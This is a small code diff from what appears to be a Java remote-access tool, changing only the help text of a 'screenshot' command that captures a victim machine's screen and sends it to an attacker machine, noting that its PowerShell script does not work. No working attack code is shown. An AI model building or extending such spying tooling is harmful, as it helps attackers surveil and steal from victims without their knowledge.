@@ -9,7 +9,7 @@ import connection.Server;
 public class ScreenShotCommand extends Command{
 
 	public ScreenShotCommand() {
-		super("screenshot", null, "takes a screenshot of the victim machine and sends it to the attacker machine");
+		super("screenshot", null, "(PowerShell script doesn't work) takes a screenshot of the victim machine and sends it to the attacker machine");
 	}
 
 	@Override
